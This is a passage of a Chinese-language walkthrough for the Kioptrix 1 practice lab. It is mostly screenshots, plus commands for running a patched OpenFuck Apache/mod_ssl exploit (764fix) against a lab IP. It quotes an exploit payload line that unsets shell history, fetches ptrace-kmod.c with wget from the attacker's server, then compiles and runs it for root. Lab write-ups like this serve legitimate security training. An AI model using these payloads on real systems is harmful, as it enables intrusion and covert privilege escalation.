...
![image-20200611201138421](assets/kioptrix1.assets/image-20200611201138421.png)



![image-20200611201722519](assets/kioptrix1.assets/image-20200611201722519.png)



![image-20200611203842297](assets/kioptrix1.assets/image-20200611203842297.png)



![image-20200611223510972](assets/kioptrix1.assets/image-20200611223510972.png)

修正方案：

![image-20200611224031581](assets/kioptrix1.assets/image-20200611224031581.png)

![image-20200611224154285](assets/kioptrix1.assets/image-20200611224154285.png)
 ...
 * Compile with: gcc -o 764fix 764fix.c -lcrypto
...
#define COMMAND2 "unset HISTFILE; cd /tmp; wget http://192.168.43.66:8080/ptrace-kmod.c; gcc -B /usr/bin -o exploit ptrace-kmod.c; ./exploit; \n"
...
![image-20200611220301456](assets/kioptrix1.assets/image-20200611220301456.png)
...
![image-20200611220810790](assets/kioptrix1.assets/image-20200611220810790.png)
...
当前文件目录应存在ptrace-kmod.c，不存在则可以使用原版c代码中的地址下载

![image-20200611222700230](assets/kioptrix1.assets/image-20200611222700230.png)

在文件夹建立服务器

![image-20200611222616711](assets/kioptrix1.assets/image-20200611222616711.png)

查阅使用方式

![image-20200611222850645](assets/kioptrix1.assets/image-20200611222850645.png)

确认目标系统

![image-20200611222809146](assets/kioptrix1.assets/image-20200611222809146.png)

```bash
./764fix 0x6b 192.168.43.224 443 -c 40
```

因为单次尝试经常失败，所以使用内置的-c参数。尝试40次

![image-20200611223031242](assets/kioptrix1.assets/image-20200611223031242.png)
